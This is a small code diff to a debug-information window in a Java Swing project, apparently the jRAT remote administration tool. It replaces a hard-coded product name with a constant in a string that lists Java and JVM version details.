@@ -20,6 +20,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
+import pro.jrat.Constants;
 import pro.jrat.common.Version;
 
 
@@ -88,7 +89,7 @@ public class FrameDebugInfo extends BaseFrame {
 	public void loadData() {
 		StringBuilder sb = new StringBuilder();
 		
-		sb.append("jRAT Version: " + Version.getVersion() + "\n\r");
+		sb.append(Constants.NAME + " Version: " + Version.getVersion() + "\n\r");
 		sb.append("JVM Version: " + System.getProperty("java.vm.version") + "\n\r");
 		sb.append("Java Runtime Version: " + System.getProperty("java.runtime.version") + "\n\r");
 		sb.append("Java Version: " + System.getProperty("java.version") + "\n\r");
